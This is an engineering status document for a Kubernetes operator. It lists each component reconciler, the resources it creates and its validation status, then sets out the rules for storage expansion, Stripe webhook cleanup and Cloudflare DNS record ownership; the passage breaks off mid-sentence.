# Component reconcilers

What the operator creates per component, and reconciler status. Update this as each
reconciler lands.

**Status summary.** All component reconcilers are implemented and validated on AKS: every
component (engine, control-plane Postgres, the four data stores, ingestion, workers, dashboard,
DISCO, IdP, demoSeed) reconciles into the right topology and owner-GCs on delete. The Cloudflare
DNS reconciler is implemented but not yet live-tested. Component images are built from source by
the bridge's [`build/images`](https://github.com/oramasearch/orama-cloud-v1-bridge/tree/main/build/images)
tooling and pushed to **private Docker Hub**; set `spec.images.tag` + `spec.images.pullSecretName`
([install §4](install.md#4-override-the-dummy-secrets--images-for-real-use)). Remaining `OramaCloudV1`
work is **hardening**: full config/secrets, Cloudflare LB, the workers-bundle in-cluster
wiring. The `Lake` CR is in production (`Lake/prod` on AKS); see the lake rows below.

| Component | Reconciler | Creates | Status |
|---|---|---|---|
| **engine** | `internal/controller/engine.go`, `cloudv1_networking.go` | writer `StatefulSet` (PVC) on the primary; readers `StatefulSet` (PVC each, +Envoy sidecar); **shared `embeddings` Deployment** (ai-server :50051, +GPU when `writer.gpu`); Services; engine `ConfigMap`; with `writer.host` / `reader.host`, the `<cr>-writer` / `<cr>-reader` Ingresses with origin TLS | ✅ **done** (validated on AKS); public hosts 🟡 **implemented** ([#385](https://github.com/oramasearch/orama-operator/issues/385)), fake-client coverage, not yet proven on `v1-dev` |
| **dashboard** | `internal/controller/app.go`, `dashboard_env.go`, `dashboard_crons.go` | `Deployment` + Service + `Ingress` with origin TLS from the stack's Let's Encrypt `Issuer` ([#457](https://github.com/oramasearch/orama-operator/issues/457)); user environment from `dashboard.envFrom`/`env`, hashed into the pod template ([#311](https://github.com/oramasearch/orama-operator/issues/311)); opt-in `dashboard.crons`: Prod 1's three Vercel crons and the e2e canary as CronJobs, created suspended ([#17](https://github.com/oramasearch/orama-operator/issues/17), [below](#the-dashboards-scheduled-jobs)); never runs `db-migrate`. The control DB is always in-cluster (`mode: external` is refused); the operator's `PostgresSchema` owns its schema, avoiding a second Drizzle migration (Postgres `42710`, "type already exists") | ✅ **done** (validated on AKS) |
| **docs** | `internal/controller/app.go` | `Deployment` + Service + `Ingress` with origin TLS (docs.orama.com, Next.js + Fumadocs, `:3000`) | ✅ **done** |
| **ingestion** | `internal/controller/ingestion.go` | index-builder `Deployment` + HARVEST master + Mongo `StatefulSet` + Selenium | ✅ **done** (validated on AKS) |
| **controlDB** | `internal/controller/controldb.go` | Always in-cluster CloudNativePG `Cluster` (primary bootstrap; read-tier replica); `mode: external` is refused. Four owned **`PostgresSchema`s**, applied in order, give it the dashboard's Drizzle schema 0000 to 0008, its reference rows and the `migration` role's grants; the CNPG managed role `migration` signs in only while an `OramaCloudV1Migration` targets the stack ([#653](https://github.com/oramasearch/orama-operator/issues/653)); + a Job inserting the `c1` `oramacore_clusters` row into an empty table ([#443](https://github.com/oramasearch/orama-operator/issues/443)) ([#378](https://github.com/oramasearch/orama-operator/issues/378); see [controlDB](#controldb-internalcontrollercontroldbgo)) | ✅ **done** (validated on AKS); schema CRD 🟡 **implemented** ([#40](https://github.com/oramasearch/orama-operator/issues/40), supersedes the [#34](https://github.com/oramasearch/orama-operator/issues/34) Job) |
| **controldb-schema** | `internal/controller/postgresschema_controller.go` | owns an idempotent migration Job (wait → guard + every recorded `schema_migrations` row → apply-in-one-txn, or with `applyEveryVersion` no guard) from a `PostgresSchema` CRD, recording the applied version in `.status` (no finalizer — never drops data). The stack reports its control-DB schemas as one `controldb-schema` component | 🟡 **implemented** ([#40](https://github.com/oramasearch/orama-operator/issues/40); see [`datastore-crds.md`](datastore-crds.md)) |
| **analytics** | `internal/controller/datastore.go` | ClickHouse `StatefulSet` + Service (8123/9000) | ✅ **done** (validated on AKS) |
| **cache** | `internal/controller/datastore.go` | Redis `StatefulSet` + Service (6379) | ✅ **done** (validated on AKS) |
| **broker** | `internal/controller/datastore.go` | RabbitMQ `StatefulSet` + Service (5672/15672/5552), central placement; + an owned **`RabbitMQTopology`** (vhost/users/permissions/`oramacore-operations` stream) reconciled via the management API | ✅ **done** (validated on AKS); topology CRD 🟡 **implemented** ([#40](https://github.com/oramasearch/orama-operator/issues/40)/[#41](https://github.com/oramasearch/orama-operator/issues/41)) — see [`datastore-crds.md`](datastore-crds.md) |
| **broker-topology** | `internal/controller/rabbitmqtopology_controller.go` | reconciles the broker's vhosts/users/permissions/streams via its management HTTP API (:15672) from an owned `RabbitMQTopology` CRD (finalizer teardown); least-privilege per-service users + the `oramacore-operations` replication stream, declared with the **same `x-max-length-bytes` (5 GB) OramaCore uses** on its own stream-protocol Create — a mismatched/absent arg makes RabbitMQ 400 the redeclare and fails the whole reconcile before the users exist (the reader then can't auth) | ✅ **done** (validated on AKS) ([#40](https://github.com/oramasearch/orama-operator/issues/40)/[#41](https://github.com/oramasearch/orama-operator/issues/41)) |
| **search** | `internal/controller/datastore.go` | Typesense `StatefulSet` + Service (8108) | ✅ **done** (validated on AKS) |
| **disco** | `internal/controller/disco.go` | `Deployment` (DISCO + embeddings sidecar) + Service | ✅ **done** (validated on AKS) |
| **workers** | `internal/controller/app.go` | one bundled-image `Deployment` + Service | ✅ **done** (validated on AKS) |
| **analytics-processor** | `internal/controller/gaps.go` | `Deployment` + Service + labelled config `ConfigMap` — pulls each reader's `/v1/analytics` once per import, by its own address through `<cr>-reader-headless`, with the analytics key (`<cr>-analytics-api-key`, no master key) → ClickHouse. The image must carry the bridge's `0.0.0.0:8080` listener patch ([Analytics import](#analytics-import)) | 🟡 **implemented**, unit-tested; import on `v1-dev` pending ([#5](https://github.com/oramasearch/orama-operator/issues/5), [#388](https://github.com/oramasearch/orama-operator/issues/388)) |
| **analytics-import** | `internal/controller/gaps.go` | opt-in `CronJob` `<cr>-analytics-import`: `POST /import`, then `POST /aggregate2`, to the processor every five minutes (UTC), `Forbid`, no retries, no credentials; `import.suspend` → `spec.suspend` | 🟡 **implemented**, unit-tested; scheduled run on `v1-dev` pending ([#388](https://github.com/oramasearch/orama-operator/issues/388)) |
| **analytics-retention** | `internal/controller/gaps.go` | `Job` `<cr>-analytics-retention`: sets a 30-day TTL on the processor's three ClickHouse tables, once per script version; `status.components[analytics-retention]` reads `applied`, `pending` or `failed, retrying` | 🟡 **implemented**, unit-tested; not live-tested ([#388](https://github.com/oramasearch/orama-operator/issues/388)) |
| **oramasearch-app** | `internal/controller/gaps.go` | `Deployment` + Service + `Ingress` — api.askorama.ai (legacy); unwired, so its `host` and `extraHosts` are API-only (checked for duplicates, never served) | 🟡 **modeled** ([#7](https://github.com/oramasearch/orama-operator/issues/7); image is a follow-up) |
| **search-workers** | `internal/controller/gaps.go` | 4 CF-worker `Deployment`s (index-shared / large-index / openai-decrypter / telemetry) | 🟡 **modeled** ([#6](https://github.com/oramasearch/orama-operator/issues/6); images + CF-binding wiring are a follow-up) |
| **cloudflare** | `internal/controller/cloudflare.go`, `cloudflarednsrecord_controller.go` | owned DNS child CRs; create marked records, reconcile only owned or legacy-ID records, and check ownership before cleanup | 🟡 **implemented**; HTTP/fake-client and local API-server tests pass; Lake and `oramadev.net` live proof pending approval |
| **cloudflare-r2** | `internal/controller/cloudflarer2bucket_controller.go` | an R2 bucket from a `CloudflareR2Bucket`; with `spec.credentials` an account API token scoped to the bucket and its S3 credentials in an owned Secret; on deletion the token is revoked and, with `deletionPolicy: Delete` only, the bucket deleted | 🟡 **implemented**; fake-API tested ([#453](https://github.com/oramasearch/orama-operator/issues/453)) |
| **backups** | `internal/controller/backupschedule_controller.go`, `backup_controller.go`, `internal/backup/` | `BackupSchedule` → one `Backup` per cron tick with retention; `Backup` → a restricted, credential-free Job from the operator's own image (`/manager backup`), an owned `NetworkPolicy` and a copy of the bucket's scoped credentials; status from the Job's termination message; objects deleted with the Backup. Mechanisms: ClickHouse (`BACKUP ... TO S3`); Postgres and the rest refused until built | 🟡 **implemented**, not yet applied to a cluster — see [`backups.md`](backups.md) ([#453](https://github.com/oramasearch/orama-operator/issues/453)) |
| **cloudflare-lb** | `internal/controller/cloudflareloadbalancer_controller.go` | global **Load Balancer** + **Origin Pool(s)** + **Health Monitor** via the CF Load Balancing API, from an owned `CloudflareLoadBalancer` CRD (finalizer teardown) | 🟡 **implemented** ([#73](https://github.com/oramasearch/orama-operator/issues/73); not live-tested — needs LB enabled on the account; live-node origins are [#74](https://github.com/oramasearch/orama-operator/issues/74)) |
| **idp** (keycloak) | `internal/controller/idp.go` | Keycloak `Deployment` + Service (when `idp.provider=keycloak`) | ✅ **done** (validated on AKS) |
| **demoSeed** | `internal/controller/idp.go` | one-shot seed `Job` (placeholder) | ✅ **done** (validated on AKS) |
| **zetta-capacity** | `internal/controller/zetta_capacity.go` | Karpenter `NodePool` (unstructured, cluster-scoped) + a `PodDisruptionBudget`; pins the Zetta pods onto the pool (taint/toleration + nodeSelector + `do-not-disrupt`) | 🟡 **implemented** (opt-in, [#69](https://github.com/oramasearch/orama-operator/issues/69) first slice; not yet live-tested — needs an EKS/AKS-NAP cluster) |
| **zetta-capacity-install** | `internal/controller/zetta_capacity_install.go` | Operator-owned **Karpenter install** (cloud-gated): server-side-applies the pinned upstream controller (Deployment + ServiceAccount + RBAC) + Karpenter CRDs, as `unstructured` | 🟡 **implemented** (opt-in `install: true`, [#75](https://github.com/oramasearch/orama-operator/issues/75); EKS self-install, no-op on AKS-NAP/bare-metal; not yet live-tested) |
| **lake** (liquid project) | `internal/controller/lake_controller.go` | from one cluster-scoped `Lake` CR: Namespace, owned or referenced store PVC, hardened RWO-safe `Recreate` Deployment (pod `ndots:2`, as on agent and app pods, so full Service names resolve on the first query) + conditional PDB + Service, admin-token, instance-KEK and sealing-key Secrets, CNPG control-plane `Cluster` + owned `PostgresSchema` (lake's schema), owned `OramaZettaCluster` data plane, opt-in Barman R2/S3 `ScheduledBackup`, opt-in TLS Ingress + `CloudflareDNSRecord`, with `spec.clerk` a Clerk instance kept configured through the Backend API, its keys in an owned Secret and a production instance's DNS records ([`lake/clerk.md`](lake/clerk.md)), with `spec.payments` an owned `PaymentProvider`, Stripe `PaymentWebhookEndpoint` and Lake's `PaymentCatalog`, its Stripe variables given once they are ready, with `spec.billing` `LAKE_BILLING=on` ([`lake/payments.md`](lake/payments.md)), Lake-owned environments, and per-data-service lifecycle evidence | ✅ **done** (`Lake/prod` live on AKS; issue #122's rolling proof is superseded by the RWO-safe restart check; issue #125 live Zetta proof is deferred until this controller is deployed; data services remain unmanaged until their required rehearsals pass) — see [`lake/README.md`](lake/README.md), [`lake/backups.md`](lake/backups.md), [`lake/data-services/README.md`](lake/data-services/README.md), and [`lake/sealed-secrets.md`](lake/sealed-secrets.md) |
| **lake e2e** | `internal/controller/lakee2etest_controller.go` | from one cluster-scoped `LakeE2ETest`: waits for the target Lake, Postgres, and schema, then owns a runner Job in the Lake namespace with the in-cluster URL and unique run identity | 🟡 **implemented** ([#123](https://github.com/oramasearch/orama-operator/issues/123)); fake-client verified, real k0s run deferred — see [`lake/README.md`](lake/README.md#service-e2e) |
| **lake-environment** | `internal/controller/lakeenvironment_controller.go`, `internal/controller/zetta_deployments.go` | materializes lake-shaped `orama_control` rows (deployments, environment values, custom domains; operator#560) into stable Lake-owned `LakeEnvironment` CRs and answers them with status rows; each creates a PSS-restricted Namespace, default-deny and access NetworkPolicies, ResourceQuota, LimitRange, `untrusted` runtime Deployment, Service, sealed-secret copies with local LakeSealedSecret owners and derived Pod annotations, admission-selecting namespace labels, optional Ingress, named-environment DNS, and per custom domain an Ingress rule and owned DNS record | 🟡 **implemented** ([#124](https://github.com/oramasearch/orama-operator/issues/124), [#142](https://github.com/oramasearch/orama-operator/issues/142)); fake-client, envtest and Zetta-double verified, real liquid→k0s change-page proof deferred — see [`lake/environments.md`](lake/environments.md) |
| **lake-app** | `internal/controller/lakeapp_controller.go`, `lakeapp_tokens.go` | isolated restricted workload, quota, limits, Deployment, Service and authenticated ingress; synchronized apps keep binding-derived network paths only before their workspace activates declared connections, then retain DNS and owning-Lake egress while `Connection` supplies workload paths; generated source/Zetta/event/registry-pull tokens, rollout gated on hash registration, a merged Docker config for Lake registry pulls, selected Secret keys copied and rendered as `secretKeyRef` environment entries, optional app.toml entrypoint, accurate stopped state and best-effort Lake events; one-release legacy whole-Secret `envFrom` delivery remains supported | 🟡 **implemented** (#193, #194, #221, #241, #468); native envtest covers lifecycle, bindings, secret environment delivery, token and pull-Secret rotation, pod references and namespace/DNS finalization; live app-runtime proof deferred — see [`lake/apps.md`](lake/apps.md) |
| **lake-apps-sync** | `internal/controller/lake_apps*.go`, `lake_services_notify.go` | on every Lake, control-Postgres apps rows to Lake-owned CRs in their workspace namespace, including the object-form `secret_env_refs` contract; generation-guarded status/hash writes, `lake_apps` listener and 60-second fallback, orphan removal, one proxied wildcard DNS record; the Lake pod receives `spec.apps.wildcard` (empty: the Lake's `spec.host`) as `LAKE_APPS_WILDCARD`; same-workspace Service connections use ID aliases alongside existing slug keys | 🟡 **implemented** (#194, #204, #221); fake Lake store with native envtest, native SQL contract fixture and DNS/listener tests; requires lake#293's migration and API at deployment — see [`lake/apps.md`](lake/apps.md) |
| **lake-workspaces** | `internal/controller/lake_workspaces*.go`, `lake_services_notify.go` | on every Lake, control-Postgres workspace rows to `<environment>-ws-<id>` namespaces; dedicated `lake_workspaces` listener and 60-second recovery list; restricted PSA, tokenless default ServiceAccount, per-plan ResourceQuota and LimitRange, default-deny plus explicit NetworkPolicies (including the per-kind datastore operator ingress and the CNPG/Strimzi/TiDB Kubernetes API egress, operator#268), local pull and Zetta credentials, exclusive ownership of the workspace Zetta, its volumes grown in place from lake's `storage_gi` (never shrunk; observed size, phase and message on the row, operator#259), comparison-gated workspace plus service status, stopped-data retention and namespace deletion; exact legacy Lake-namespace Zetta resources are logged and recreated fresh | 🟡 **implemented** (#190, #219, lake#265); fake-client lifecycle and policy tests, alternating-poll envtest and a native SQL fixture; live network proof uses `make verify-workspace-isolation` — see [`lake/workspaces.md`](lake/workspaces.md) |
| **lake-connections** | `internal/controller/lake_connections*.go`, `connection_controller.go`, `lake_services_notify.go` | after `network_guard`, polls Lake's `network_connections`, listens on `lake_network`, creates one workspace `Connection` per row, resolves app/service/agent identities and target Service ports, adds paired ingress/egress allowances to the workspace `NetworkSandbox`, writes comparison-gated `network_connection_status`, removes absent/orphan paths, and retires `allow-workspace-internal` only after every initial path is Ready | 🟡 **implemented** ([#468](https://github.com/oramasearch/orama-operator/issues/468)); fake-store/client policy and rollout coverage plus opt-in pgx contract coverage; named nonprod connectivity probe pending — see [`infrastructure/connections.md`](infrastructure/connections.md) |
| **tunnels** | `internal/controller/lake_tunnels*.go`, `tunnel_controller.go`, `zettatunnel_controller.go`, `zettatunnel_relay.go`, `cloudflaretunnel_controller.go`, `tunnel_pki.go`, `tunnel_shared.go` | after `network_guard` and Lake 0085, one Lake-controlled `Tunnel` per live grant; `ZettaTunnel` runs the per-grant zetta-tunnel endpoint, its generated `Connection` and relay-only allowance, and feeds the cluster's one relay (namespace `zetta-tunnel`, LoadBalancer 443, grants file and client-CA union, operator relay and workload CAs); `CloudflareTunnel` uses only a customer's own Cloudflare account (tunnel, CNAME, Access for one person, `cloudflared`); expiry/revocation tear down before `Expired`/`Revoked`; status returned to `network_tunnel_grant_status` | 🟡 **implemented** ([#471](https://github.com/oramasearch/orama-operator/issues/471)); fake-store/client, fake Cloudflare API and envtest coverage plus opt-in pgx contract coverage; live nonprod acceptance pending — see [`infrastructure/tunnels.md`](infrastructure/tunnels.md) |
| **peer-connections** | `internal/controller/lake_peers*.go`, `peerconnection_controller.go`, `peerlink_controller.go` | after `network_guard`, one Lake-controlled `PeerConnection` per `network_peers` row; per end a zetta-tunnel peer gateway (LoadBalancer 7446, projected `peer.json`), one Service per import and sandbox allowances limited to the named services; `PeerLink` on the managing cluster mints the pair's CA and certificates and writes each end's credentials on its cluster; absent withdraws Services and policies before the gateway; status to `network_peer_status` | 🟡 **implemented** ([#472](https://github.com/oramasearch/orama-operator/issues/472)); two-fake-cluster rehearsal, Lake intake, envtest CRD and opt-in pgx coverage; live two-cluster rehearsal pending — see [`infrastructure/peer-connections.md`](infrastructure/peer-connections.md) |
| **ingress-gateway** | `internal/controller/zettatunnel_ingress.go` | on every cluster: namespace `zetta-tunnel-ingress`, IngressClass `zetta-tunnel`, LoadBalancer 443, the zetta-tunnel ingress Deployment (zero replicas with nothing to serve), routes and certificates in one Secret, a report ConfigMap, its sandbox; serves every operator Ingress with a TLS Secret except Lake apps; addresses only fully served `zetta-tunnel` Ingresses; backends admit it beside ingress-nginx | 🟡 **implemented** ([#473](https://github.com/oramasearch/orama-operator/issues/473)); fake-client coverage; per-cluster cutover pending cert-manager (#457) — see [`infrastructure/ingress.md`](infrastructure/ingress.md) |
| **mesh** | `internal/controller/zettatunnel_mesh.go`, `internal/meshprojection/`, `cmd/mesh-projector/` | on every cluster: namespace `zetta-tunnel-mesh` (privileged), one agent DaemonSet per node, pinned to it (privileged zetta-tunnel agent + restricted projector), one template Secret per node holding only that node's workload keys ([#788](https://github.com/oramasearch/orama-operator/issues/788)), the workload CA in the operator namespace; enrolled sandboxes render Connections on 15008 only and are projected after rendering, one identity and certificate per pod | 🟡 **implemented** ([#474](https://github.com/oramasearch/orama-operator/issues/474)); unit, fake-client and envtest coverage; live fail-closed proof pending, enrolment blocked on zetta-tunnel (probes, non-mesh peers) — see [`infrastructure/mesh.md`](infrastructure/mesh.md) |
| **ingress-gateway** | `internal/controller/zettatunnel_ingress.go` | on every cluster: namespace `zetta-tunnel-ingress`, IngressClass `zetta-tunnel`, LoadBalancer 443, the zetta-tunnel ingress Deployment (zero replicas with nothing to serve), routes and certificates in one Secret, a report ConfigMap, its sandbox; serves every operator Ingress with a TLS Secret except Lake apps and any host that requires an origin client certificate (nginx auth-tls, #798); addresses only fully served `zetta-tunnel` Ingresses; backends admit it beside ingress-nginx | 🟡 **implemented** ([#473](https://github.com/oramasearch/orama-operator/issues/473)); fake-client coverage; per-cluster cutover pending cert-manager (#457) — see [`infrastructure/ingress.md`](infrastructure/ingress.md) |
| **mesh** | `internal/controller/zettatunnel_mesh.go`, `internal/meshprojection/`, `cmd/mesh-projector/` | on every cluster: namespace `zetta-tunnel-mesh` (privileged), the agent DaemonSet (privileged zetta-tunnel agent + restricted projector), 16 template shard Secrets, the workload CA in the operator namespace; enrolled sandboxes render Connections on 15008 only and are projected after rendering, one identity and certificate per pod | 🟡 **implemented** ([#474](https://github.com/oramasearch/orama-operator/issues/474)); unit, fake-client and envtest coverage; live fail-closed proof pending, enrolment blocked on zetta-tunnel (probes, non-mesh peers) — see [`infrastructure/mesh.md`](infrastructure/mesh.md) |
| **lake-volume-snapshots** | `internal/controller/lake_volume_snapshots*.go`, `lake_services_notify.go` | on every Lake, control-Postgres `volume_snapshot_policies` to CSI `VolumeSnapshot`s of lake's store claim and each workspace Zetta's claims: the `Retain` `VolumeSnapshotClass` created when absent, `<claim>-<UTC timestamp>` snapshots on the cron schedule, at first sight and on `requested_at`, pruning beyond `keep`, bound contents labelled with their target, comparison-gated `volume_snapshot_status`; deleted workspaces are left alone; dedicated `lake_volume_snapshots` listener and 60-second poll | 🟡 **implemented** (#260); envtests against the upstream snapshot CRDs and a native SQL fixture; a live snapshot and restore on dev are pending — see [`lake/volume-snapshots.md`](lake/volume-snapshots.md) |
| **lake builds** | `internal/controller/lake_builds.go`, `internal/controller/lake_builds_pgx.go`, `internal/controller/lake_services_notify.go` | on every Lake: injects `LAKE_INTERNAL_URL` for Lake's registry authority, reads queued/cancelled `builds` rows from Lake control Postgres, creates one rootless BuildKit Job and scoped-token Secret in a deterministic per-space namespace, applies default-deny plus Lake/package-index egress and the Cilium `deny-cloud-metadata` policy ([#761](https://github.com/oramasearch/orama-operator/issues/761)), enforces per-Lake and per-space concurrency, sends pod-level progress events, parses the final digest/size from pod logs, and comparison-gates row updates; `LISTEN lake_builds` provides prompt wake-up while polling recovers missed notifications | 🟡 **implemented** ([#195](https://github.com/oramasearch/orama-operator/issues/195)); fake-client, native envtest, and pgx contract coverage; dev-cluster build-and-pull deferred until a published lake-builder image and matching Lake registry endpoints are available — see [`lake/builds.md`](lake/builds.md) |
| **lake managed services** | `internal/controller/lake_services.go`, `internal/controller/lake_services_pgx.go`, `internal/controller/lake_controller.go` | on every Lake: polls lake's `services` table over pgx at `spec.deploySync.interval`; owns Zetta, Postgres and catalog service resources, connection delivery, comparison-gated status, deletion and `spec.services.maxServices`, except that it skips the workspace-owned `zetta_service_id`. Workspace synchronization has its own listener and quota. Catalog kinds use their upstream operators; SQLite, DuckDB and Polars use operator-owned wrappers | 🟡 **implemented** (liquid-bridge decisions 46 and 47; #219); fake-store/client, alternating-poll envtest and pgx coverage, selected live service proof, catalog-schema validation — see [`lake/services.md`](lake/services.md) |
| **lake methodology runs** | `internal/controller/lake_methodology_runs.go`, `internal/controller/lake_methodology_runs_pgx.go` | on every Lake, with `spec.methodologies.runtimeImage` or the operator's default: reads `methodology_runs` rows with their image build, waits for the build, then runs a stage, a sandbox and a collect Job sharing a per-run PVC in the restricted, default-deny namespace `lake-<name>-methodology-runs`; generates the run's `lmr.` credential (only its SHA-256 is written) and a pull Secret for the built image; the sandbox has no credential, token, service links or network unless granted (public internet only); counts each run and served model against its workspace's ResourceQuota and LimitRange through a never-scheduled reservation pod `<slug>-quota` in the workspace's namespace (Queued while there is no room, #799) and caps them all with ResourceQuota `methodology-ceiling`; writes phases, exit code and the sandbox's start and finish to `methodology_run_status` on change, the sandbox's resources to `workload_resources`, and removes the run's objects when it ends | 🟡 **implemented** ([#291](https://github.com/oramasearch/orama-operator/issues/291), [lake#655](https://github.com/oramasearch/lake/issues/655)); fake-client and pgx contract coverage; live run waits for lake#655 and the runtime image — see [`lake/methodology-runs.md`](lake/methodology-runs.md) |
| **lake workload resources** | `internal/controller/lake_workload_resources.go`, `internal/controller/lake_workload_resources_pgx.go` | on the control-rows poll, at most every 30 seconds per Lake: one `workload_resources` row in the Lake's control Postgres per workspace engine, managed service, app, build, agent launch and agent cron run (lake#658), holding the effective CPU and memory requests (request, else limit; init containers, sidecars and overhead as Kubernetes counts them), GPUs, GPU class (GPU feature discovery's product label, normalized) and VRAM of its scheduled pods; written only on change; a job's row is written from its Job as soon as the Job exists, a finished build or job keeps its values with `pods` 0, and a finished run with no row is backfilled from the pod spec the operator schedules it with (lake#658); rows of objects lake no longer has are deleted | 🟡 **implemented** ([lake#643](https://github.com/oramasearch/lake/issues/643), [lake#658](https://github.com/oramasearch/lake/issues/658)); fake-client and pgx contract coverage; a live run on dev waits for the lake side of lake#643 — see [`lake/workload-resources.md`](lake/workload-resources.md) |
| **lake Postgres rehearsals** | `internal/controller/lakerestorerehearsal_controller.go` | from one cluster-scoped `LakeRestoreRehearsal`: isolated CNPG backup recovery and data verification for restore; scratch image update then verification for upgrade; CNPG primary switchover then application-Secret connection verification for failover; terminal cleanup and Lake evidence update | ✅ **implemented** — see [`lake/data-services/postgres.md`](lake/data-services/postgres.md) |
| **lake sealed-secret delivery** | `internal/controller/lakesealedsecret_controller.go` | from one namespaced `LakeSealedSecret`: an owned, cluster-bound Kubernetes Secret labelled `lake.orama.cloud/sealed: "true"`; literal ciphertext opens locally, while lake and dynamic references call lake's mint capability authenticated by the Lake's admin bearer alone (the operator's Kubernetes token is never sent, #791) | 🟡 **implemented**; literal delivery and LakeEnvironment consumption with local delivery owners are complete and tested against both k0s admission policies, while lake/dynamic delivery awaits lake's `mint_sealed_secret` leaf |
| **deployment control plane** | `internal/controller/deployment_controlplane.go` | authenticated liquid REST `/v1` and MCP server; appends immutable Zetta history, desired rows in lake's shape and audit entries, validates sealed-secret references, and reads reconciled `LakeEnvironment` status | ✅ **implemented** ([#142](https://github.com/oramasearch/orama-operator/issues/142)); REST/MCP, drift, Zetta-double and envtest coverage — see [`control-plane/README.md`](control-plane/README.md) |

## Payment webhook endpoints

`PaymentWebhookEndpoint` owns a `StripeWebhookEndpoint` for a Stripe provider. Its concrete
controller creates the vendor endpoint and an owned signing Secret. On deletion, its finalizer
retries unavailable credentials and Stripe failures every minute for five minutes from the
deletion timestamp, then releases the object with an `EndpointLeftBehind` Warning naming the
endpoint to delete in the Stripe Dashboard. Stripe 401/403 responses or a missing provider/key
Secret release it immediately. With an empty endpoint ID, a working key still cleans up the
endpoint matching our owner tag and URL; cleanup failures are logged and release it immediately
without an event, as do unavailable credentials. Kubernetes read errors still retry.
The abstract controller makes no vendor calls, and `PaymentProvider` has no
finalizer. See [payments](infrastructure/payments.md#deleting-an-endpoint).

## Component storage

`internal/controller/storage.go` runs after ordinary component provisioning. It manages the
primary's enabled writer, the readers of an enabled engine (in a primary or read region), and the
enabled analytics/cache/broker/search stores selected by their
existing in-cluster mode and placement checks. External stores, disabled components, a read
region's absent writer, and central stores skipped in a read region contribute no mismatch.
ControlDB is always in-cluster (decision 61) and follows its enabled policy. HARVEST Mongo keeps the
shared helper's `10Gi`/default-class output and has no new storage setting.

Writer, reader and store `storage.size` default to `10Gi`
([engine](#engine-internalcontrollerenginego)); every reader's claim `data-<cr>-reader-<n>` grows
like the writer's; `storage.storageClassName` is optional. Omitted
storage, `{}`, or a missing size resolves to that default even before API admission. Explicit sizes
must be positive Kubernetes quantities, compared with `Cmp` (`10240Mi` equals `10Gi`), and explicit
class names must be nonempty. The [field reference](crd-reference.md#component-storage) lists every
path. Set templates use `spec.template.components`, with the same component fields.

The StatefulSet creation callback initializes the `data` claim template once. Later reconciliations
preserve its full fetched contents, including admission fields and its original size/class, while
Services, PDBs, pod templates and ordinary settings continue to reconcile. The storage pass checks
the controlled StatefulSet's `data` claims in the same namespace, using complete names of the form
`data-<statefulset>-<numeric ordinal>`. Retained matching claims are included; direct umbrella
ownership on a PVC is unnecessary under StatefulSet's default retention policy. Similar prefixes,
other namespaces and claims controlled by unrelated workloads are never adopted or resized.

For each compatible claim the operator patches only a larger `spec.resources.requests.storage`,
with optimistic concurrency. Equal numeric quantities do nothing. It never changes PV capacity.
A shrink compares against the requested size; capacity is extra evidence because a provisioner
can round it upward. An explicit class mismatch blocks the entire write to that claim, including
an otherwise valid increase, and all applicable differences remain in status. A missing required
claim remains pending; when it appears from the unchanged old template, a later pass grows it.
Read/write failures identify the resource and API error and do not block other storage updates.

CNPG creation renders the resolved size and optional `storageClass`. Ordinary reconciliation
preserves an existing Cluster's whole `spec.storage`, so rejected storage settings cannot block
unrelated spec or schema reconciliation. The storage pass increases only `spec.storage.size`,
preserving all other storage keys and retaining the class when omitted. Changing the class,
including adding an explicit class to an existing classless Cluster, or reducing size leaves its
storage unchanged. The operator never resizes CNPG-owned PVCs itself.

`StorageApplied` is one merged condition with the current `ObservedGeneration`. It preserves
`Ready`, phase, component readiness and other conditions. `True / Applied` means desired
configuration was accepted, including the no-local-storage case; it does not mean physical
expansion completed. Otherwise it is `False / NotApplied`, and the message lists, in stable sorted
order, each resource with its problem: `ShrinkNotSupported`, `StorageClassChangeNotSupported`,
`StorageUpdateFailed` or `ClaimsPending`. It is a condition of its own, not part of `Ready`, so a
refused shrink or a resize in progress never marks a serving stack not Ready. One success cannot erase another resource's failure. Accepted
settings and successful retries recover the condition; unchanged results cause no status write.
Removing storage settings after growth resolves to `10Gi`, so recovery requires restoring the
current grown request rather than relying on the old default.

A 20-second bounded poll continues whenever managed storage exists, including with Ready
workloads. CSI/kubelet perform disk/filesystem expansion after accepting PVC requests; CNPG
performs its own expansion after accepting the Cluster size. The StorageClass must allow expansion
and its CSI driver must support the disk/filesystem operation. See
[Kubernetes expansion](https://kubernetes.io/docs/concepts/storage/persistent-volumes/#expanding-persistent-volumes-claims)
and [CNPG expansion](https://cloudnative-pg.io/docs/1.27/storage/#volume-expansion).
A grown size stays in the set file that set it: a smaller value afterwards is a refused shrink.

## Cloudflare DNS ownership

`CloudflareDNSRecord` creates new records with comment
`orama-operator:<namespace>/<name>` and saves the ID and exact comment in status. A record
several resources keep (a Clerk production instance's records, which every Lake sharing the
instance writes) names one owner in `spec.sharedOwner`, and is created with comment
`orama-operator:<sharedOwner>` (`clerk/<instance ID>` for Clerk). Every resource with that
`sharedOwner` recognises the record as the operator's own; a record without the comment is
still refused. `sharedOwner` requires `deletionPolicy: Retain`, so no single resource deletes it.
The comment must fit Cloudflare's 100-character limit: namespace/name has at most
85 characters. Longer markers prevent creation, without blocking legacy reads or cleanup.
Records use the same-namespace Secret's `token` and `zoneID`, the requested proxy setting
and automatic TTL (`1`). Empty type retains the existing IP → A, hostname → CNAME inference.

Before writing, the controller reads every page of records at the desired name.
Any foreign A, AAAA or CNAME blocks all writes, even alongside an owned record; a
foreign TXT blocks a TXT resource (Cloudflare would reject the duplicate on every pass).
Other TXT/MX records do not block creation. Matching markers recover ownership after a
failed Kubernetes status write. Multiple owned candidates are an error. Conflicts,
invalid marker lengths and missing credentials set `ready: false` and retry after
five minutes, preserving ownership fields. Missing credentials never trigger API calls.

**`CloudflareTunnel` follows the same create-only rule** (operator#585). Its CNAME carries the marker
`orama-operator:<namespace>/<name>` (recorded as `status.dnsRecordOwnerComment`); a record already at
the tunnel's hostname without that marker is refused with an error naming operator#585 and never
repointed; teardown deletes the record only while the marker is still on it. A record tracked before
the change (no recorded marker) keeps its earlier cleanup. Tests:
`TestCloudflareTunnelNeverAdoptsARecordItDidNotCreate`,
`TestCloudflareTunnelDeletesOnlyARecordStillCarryingItsMarker`.

Pre-upgrade `status.recordID` without `status.ownerComment` retains legacy ownership
by ID. Matching records receive only reads; changes to type, content, proxying or TTL
receive one update preserving the existing comment. Legacy records never gain an
ownership comment. Marked records never fall back to legacy ownership if their
comment is removed or changed. Steady reconciliation does not rewrite DNS or status.

A changed name (or type) is a different record (#529). Once the new record exists, the one
